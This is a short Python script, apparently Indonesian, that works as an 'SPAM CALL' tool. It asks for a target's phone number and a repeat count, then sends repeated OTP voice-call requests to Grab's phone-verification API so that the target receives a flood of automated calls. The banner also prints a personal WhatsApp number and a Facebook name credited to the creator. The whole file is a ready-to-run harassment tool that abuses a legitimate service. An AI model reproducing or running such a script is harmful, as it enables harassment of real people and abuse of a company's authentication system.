#!/bin/usr/python

import os, requests, time

os.system('clear')
c=('\033[1;31m')
r=('\033[1;32m')
g=('\033[1;33m')
w=('\033[1;35m')

print ("""\033[1;35m""")
print ("""\033[1;32m _______         ______ """)
print ("""\033[1;33m __  __ \____  _____  / _____  _________ ____  __ """)
print ("""\033[1;32m _  / / /__  |/_/__  /  __  / / /__  __ \__  |/_/ """)
print ("""\033[1;33m / /_/ / __>  <  _  /____  /_/ / _  / / /__>  < """)
print ("""\033[1;32m \____/  /_/|_|  /_____/_\__, /  /_/ /_/ /_/|_| """)
print ("""\033[1;33m                        /____/ """)
print ("""\033[1;32m""")
print ("""\033[1;37m ||=========================|| \033[1;35m ┈┈┈┈┏┓┈┈┈┈☆┈┈┈┈┈ """)
print ("""\033[1;33m ‡‡    [+] SPAM CALL [+]    ‡‡ \033[1;36m ┈┈┈┈┣┫┈┈┈┈┈┈☆┈┈┈ """)
print ("""\033[1;37m ||=========================|| \033[1;35m ┈┈┈╭╯╰╮┈┈☆┈┈┈┈┈┈ """)
print ("""\033[1;35m ★★ Creator : \033[1;32mOxLynx        ★★ \033[1;36m ┈┈┈┃╭╮┃┈╭━☆╮┈┈┈┈ """)
print ("""\033[1;37m ||=========================|| \033[1;35m ┈┈┈┃╳╳┃┈┣━━┣╮┈┈┈ """)
print ("""\033[1;35m ★★ Whatsapp : \033[1;32m085850252221 ★★ \033[1;36m ╭━━┃╰╯┃━┃╲╲┣╯━━╮ """)
print ("""\033[1;37m ||=========================|| \033[1;35m ┃╲╲╰━━╯╲╰━━╯╲╲╲┃ """)
print ("""\033[1;35m ★★ Facebook : \033[1;32mBagus P      ★★ \033[1;36m |★  TELPHONE  ★| """)
print ("""\033[1;37m ||=========================|| \033[1;35m |★____________★| """)
print ("""\033[1;32m""")
no1 = input("\033[1;36m[+] Nomer Target Cuk [62xxx] : %s\033[1;37m"%(w))
jlmh=int(input("%s\033[1;36m[+] JUMLAH SPAM : %s\033[1;37m"%(g,w)))
dt1={'method':'CALL','countryCode':'id','phoneNumber':no1,'templateID':'pax_android_production'}

try:
	print()
	print("%s[?] HASIL [?]%s"%(r,w))
	for i in range(jlmh):
		print("[!] Tunggu Sebentar Cuk...")
		idk=("challengeID")
		r1 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt1)
		if str(idk) in str(r1.text):
			print("[+] BERHASIL [+]")
		else:
			print("[-] GAGAL [-]")
		print("="*30)
		time.sleep(1)
except KeyboardInterrupt:
	print ("%s [!]Gunakan Dengan Bijak Bosque [!]"%(c))
